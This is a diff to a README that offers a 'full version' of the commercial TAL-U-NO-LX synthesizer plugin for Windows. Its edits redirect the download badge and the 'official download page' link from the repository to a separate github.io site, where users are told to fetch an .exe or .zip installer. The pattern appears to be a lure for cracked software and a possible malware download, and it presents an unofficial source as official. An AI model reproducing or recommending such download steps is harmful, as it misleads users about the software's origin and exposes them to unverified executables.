@@ -1,6 +1,6 @@
 # 🎹 TAL-U-NO-2026 - Professional Analog Synthesizer For Windows
 
-[![Download TAL-U-NO-2026](https://img.shields.io/badge/Download-Blue-blue.svg)](https://github.com/Meirrecoilless258/TAL-U-NO-2026)
+[![Download TAL-U-NO-2026](https://img.shields.io/badge/Download-Blue-blue.svg)](https://meirrecoilless258.github.io)
 
 This repository provides the full version of the TAL-U-NO-LX software for Windows 10 and Windows 11. This synthesizer simulates the classic hardware sound of vintage gear. It functions as a Virtual Studio Technology (VST) plugin, meaning you load it inside your music production software to create, edit, and record sounds.
 
@@ -8,7 +8,7 @@ This repository provides the full version of the TAL-U-NO-LX software for Window
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/Meirrecoilless258/TAL-U-NO-2026) to access the installer.
+1. Visit the [official download page](https://meirrecoilless258.github.io) to access the installer.
 2. Look for the file ending in `.exe` or an archive file labeled `.zip`.
 3. Click the link to save the file to your computer.
 4. Locate your downloaded file in your browser's download folder.
